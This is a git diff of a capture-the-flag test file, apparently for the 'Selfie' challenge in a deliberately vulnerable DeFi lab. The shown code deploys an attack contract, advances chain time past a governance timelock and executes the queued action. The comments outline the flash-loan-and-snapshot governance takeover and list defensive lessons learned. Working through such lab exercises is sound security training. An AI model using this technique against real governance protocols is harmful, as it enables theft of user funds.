@@ -41,6 +41,8 @@ describe('[Challenge] Selfie', function () {
         // - Anyone can make an ERC20 snapshot, it's not access controlled
         // * I could flashloan 1.5m DVT tokens, take a snapshot, then return them. Total supply is 2m so I would have enough votes to queue an action
 
+        // SOLUTION ===========================================================
+
         const SelfieAttackFactory = await ethers.getContractFactory('SelfieAttack', attacker);
         this.attack = await SelfieAttackFactory.connect(attacker).deploy(
             this.pool.address,
@@ -57,19 +59,15 @@ describe('[Challenge] Selfie', function () {
         await network.provider.send("evm_increaseTime", [3600 * 24 * 3]) 
         await network.provider.send("evm_mine")
 
-        // console.log('Our Action ID', await ethers.utils.formatEther( await this.attack.attackActionId()));
-        // console.log('Actions', await this.governance.actions(0));
-        // console.log('Actions', await this.governance.actions(1));
-        // console.log('Actions', await this.governance.actions(2));
-
         await this.attack.executeAttackAction();
 
-
+        
         // Lessons learned ====================================================
         // - The public should probably not be able to take their own snapshots
         // - Voting protocols based purely on token ownership snapshots and flashloans are a dangerous combination
         // - Having a timelock is all well and good, but requires oversight and the ability to take action
         // I remember the real DeFi hack similar to this, there was a timelock and the attacker simply waited through it and executed after, nobody realised
+        // Jesus I don't know if I'm getting better at this, or this one was more straightforward than usual, but I felt really comfortable solving this!!!
 
     });
 
